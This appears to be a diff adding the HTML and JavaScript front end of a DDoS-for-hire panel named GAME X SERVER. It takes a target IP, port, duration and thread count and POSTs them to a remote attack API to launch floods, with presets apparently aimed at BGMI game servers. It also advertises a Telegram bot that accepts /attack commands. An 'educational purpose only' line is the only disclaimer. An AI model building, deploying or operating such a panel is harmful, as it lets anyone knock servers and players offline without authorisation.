@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>GAME X SERVER | Premium DDoS Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Rajdhani', 'Orbitron', monospace;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated Gradient Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a2e 100%);
+            z-index: -2;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(45deg, rgba(255, 0, 255, 0.05) 0px, rgba(255, 0, 255, 0.05) 2px, transparent 2px, transparent 8px),
+                repeating-linear-gradient(135deg, rgba(0, 255, 255, 0.05) 0px, rgba(0, 255, 255, 0.05) 2px, transparent 2px, transparent 8px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Glow Effect */
+        .glow {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(255, 0, 255, 0.15), transparent);
+            transform: translate(-50%, -50%);
+            filter: blur(50px);
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 550px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Glass Header */
+        .header {
+            text-align: center;
+            padding: 30px 20px;
+            background: rgba(10, 10, 20, 0.4);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 0, 255, 0.3);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.1);
+        }
+
+        .logo {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+
+        .logo i {
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .header h1 {
+            font-size: 2em;
+            letter-spacing: 4px;
+            font-weight: 800;
+        }
+
+        .header h1 span:first-child {
+            background: linear-gradient(135deg, #ff00ff, #ff6600);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .header h1 span:last-child {
+            background: linear-gradient(135deg, #00ffff, #0066ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid #00ffff;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 0.7em;
+            margin-top: 12px;
+        }
+
+        /* Neon Cards */
+        .card {
+            background: rgba(5, 5, 15, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            transition: all 0.3s;
+        }
+
+        .card:hover {
+            border-color: rgba(255, 0, 255, 0.5);
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.1);
+        }
+
+        .card-title {
+            font-size: 0.8em;
+            color: #888;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .card-title i {
+            color: #ff00ff;
+            margin-right: 8px;
+        }
+
+        /* Attack Methods */
+        .methods {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .method {
+            flex: 1;
+            padding: 12px 8px;
+            background: rgba(20, 20, 40, 0.8);
+            border: 1px solid #333;
+            border-radius: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .method i {
+            font-size: 1.5em;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .method.active {
+            background: linear-gradient(135deg, #ff00ff, #6600ff);
+            border-color: #ff00ff;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.3);
+        }
+
+        .method-name {
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .method-threads {
+            font-size: 0.65em;
+            opacity: 0.7;
+            margin-top: 4px;
+        }
+
+        /* Input Fields */
+        .input-field {
+            margin-bottom: 16px;
+        }
+
+        .input-field label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.75em;
+            color: #aaa;
+            letter-spacing: 1px;
+        }
+
+        .input-field label i {
+            color: #00ffff;
+            width: 20px;
+        }
+
+        .input-field input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+
+        .input-field input:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.2);
+        }
+
+        /* Attack Button */
+        .attack-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff00ff, #ff0066);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 20px 0 15px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .attack-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.5s, height 0.5s;
+        }
+
+        .attack-btn:active::after {
+            width: 200%;
+            height: 200%;
+        }
+
+        /* Status */
+        .status {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            font-size: 0.8em;
+            margin: 15px 0;
+            border-left: 3px solid #ff00ff;
+        }
+
+        /* Stats */
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            padding-top: 15px;
+            margin-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.6em;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .stat-label {
+            font-size: 0.6em;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        /* Bot Card */
+        .bot-card {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(20, 0, 40, 0.8));
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            text-align: center;
+        }
+
+        .bot-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0066ff, #6600ff);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: all 0.3s;
+        }
+
+        .bot-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 102, 255, 0.4);
+        }
+
+        .commands {
+            font-size: 0.7em;
+            color: #666;
+            margin-top: 12px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+
+        .commands span {
+            color: #00ffff;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            font-size: 0.6em;
+            color: #444;
+        }
+
+        /* Loading */
+        .loading-spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #fff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="glow"></div>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-gamepad"></i>
+            </div>
+            <h1><span>GAME</span> <span>X</span></h1>
+            <div class="badge" id="apiStatus">
+                <i class="fas fa-circle" style="font-size: 8px;"></i> CONNECTING...
+            </div>
+        </div>
+
+        <!-- Attack Card -->
+        <div class="card">
+            <div class="card-title">
+                <i class="fas fa-skull-crossbones"></i> ATTACK CONSOLE
+            </div>
+
+            <!-- Methods -->
+            <div class="methods">
+                <div class="method active" data-method="bgmi">
+                    <i class="fas fa-gamepad"></i>
+                    <div class="method-name">BGMI</div>
+                    <div class="method-threads">1500 THREADS</div>
+                </div>
+                <div class="method" data-method="strong">
+                    <i class="fas fa-bolt"></i>
+                    <div class="method-name">STRONG</div>
+                    <div class="method-threads">2000 THREADS</div>
+                </div>
+                <div class="method" data-method="normal">
+                    <i class="fas fa-shield-alt"></i>
+                    <div class="method-name">NORMAL</div>
+                    <div class="method-threads">500 THREADS</div>
+                </div>
+            </div>
+
+            <!-- Inputs -->
+            <div class="input-field">
+                <label><i class="fas fa-crosshairs"></i> TARGET IP</label>
+                <input type="text" id="ip" placeholder="192.168.1.100 / 8.8.8.8">
+            </div>
+
+            <div class="input-field">
+                <label><i class="fas fa-plug"></i> PORT</label>
+                <input type="number" id="port" placeholder="27015 / 80 / 443">
+            </div>
+
+            <div class="input-field">
+                <label><i class="fas fa-hourglass-half"></i> DURATION</label>
+                <input type="number" id="duration" placeholder="30 - 600 seconds">
+            </div>
+
+            <button class="attack-btn" onclick="startAttack()">
+                <i class="fas fa-skull"></i> LAUNCH ATTACK
+            </button>
+
+            <div class="status" id="statusMsg">
+                <i class="fas fa-check-circle"></i> SYSTEM READY
+            </div>
+
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="totalAttacks">0</div>
+                    <div class="stat-label">TOTAL</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="activeAttacks">0</div>
+                    <div class="stat-label">ACTIVE</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">1</div>
+                    <div class="stat-label">API</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bot Card -->
+        <div class="card bot-card">
+            <div class="card-title">
+                <i class="fab fa-telegram"></i> TELEGRAM BOT
+            </div>
+            <a href="https://t.me/Game_X_Server_bot" target="_blank" style="text-decoration: none;">
+                <button class="bot-btn">
+                    <i class="fab fa-telegram"></i> @Game_X_Server_bot
+                </button>
+            </a>
+            <div class="commands">
+                <i class="fas fa-terminal"></i> COMMANDS<br>
+                <span>/attack</span> IP PORT TIME<br>
+                <span>/bgmi</span> IP PORT TIME<br>
+                <span>/status</span> | <span>/canary</span>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <i class="fas fa-shield-alt"></i> GAME X SERVER | @Prime_X_Army<br>
+            ⚠️ EDUCATIONAL PURPOSE ONLY
+        </div>
+    </div>
+
+    <script>
+        const API_URL = 'https://prime-onyx-production.up.railway.app';
+        let currentMethod = 'bgmi';
+        let totalAttacks = parseInt(localStorage.getItem('totalAttacks') || '0');
+        
+        document.getElementById('totalAttacks').innerText = totalAttacks;
+        
+        document.querySelectorAll('.method').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.method').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentMethod = btn.dataset.method;
+            });
+        });
+        
+        async function checkAPI() {
+            try {
+                const res = await fetch(`${API_URL}/status`);
+                if (res.ok) {
+                    document.getElementById('apiStatus').innerHTML = '<i class="fas fa-circle" style="font-size: 8px;"></i> ONLINE';
+                    document.getElementById('apiStatus').style.borderColor = '#00ff00';
+                    document.getElementById('apiStatus').style.color = '#00ff00';
+                } else {
+                    throw new Error();
+                }
+            } catch(e) {
+                document.getElementById('apiStatus').innerHTML = '<i class="fas fa-circle" style="font-size: 8px;"></i> OFFLINE';
+                document.getElementById('apiStatus').style.borderColor = '#ff0000';
+                document.getElementById('apiStatus').style.color = '#ff0000';
+            }
+        }
+        
+        async function getActiveAttacks() {
+            try {
+                const res = await fetch(`${API_URL}/status`);
+                const data = await res.json();
+                document.getElementById('activeAttacks').innerText = data.active_attacks || 0;
+            } catch(e) {}
+        }
+        
+        async function startAttack() {
+            const ip = document.getElementById('ip').value.trim();
+            const port = document.getElementById('port').value;
+            const duration = document.getElementById('duration').value;
+            const statusDiv = document.getElementById('statusMsg');
+            
+            if (!ip) {
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Enter target IP!';
+                return;
+            }
+            if (!port || port < 1 || port > 65535) {
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Invalid port!';
+                return;
+            }
+            if (!duration || duration < 10 || duration > 600) {
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Duration 10-600 seconds!';
+                return;
+            }
+            
+            let threads = currentMethod === 'bgmi' ? 1500 : (currentMethod === 'strong' ? 2000 : 500);
+            let methodName = currentMethod.toUpperCase();
+            
+            statusDiv.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> INITIALIZING ${methodName} ATTACK... <span class="loading-spinner"></span>`;
+            
+            try {
+                const response = await fetch(`${API_URL}/start-server`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: ip,
+                        port: parseInt(port),
+                        duration: parseInt(duration),
+                        threads: threads
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    totalAttacks++;
+                    localStorage.setItem('totalAttacks', totalAttacks);
+                    document.getElementById('totalAttacks').innerText = totalAttacks;
+                    statusDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${methodName} ATTACK LAUNCHED! ${ip}:${port} | ${duration}s | ${threads} threads`;
+                    getActiveAttacks();
+                    
+                    setTimeout(() => {
+                        statusDiv.innerHTML = `<i class="fas fa-check-circle"></i> Attack completed! Total: ${totalAttacks}`;
+                    }, duration * 1000);
+                } else {
+                    statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Attack failed!';
+                }
+            } catch(e) {
+                statusDiv.innerHTML = '<i class="fas fa-exclamation-triangle"></i> API connection error!';
+            }
+        }
+        
+        checkAPI();
+        getActiveAttacks();
+        setInterval(() => { getActiveAttacks(); checkAPI(); }, 5000);
+    </script>
+</body>
+</html>
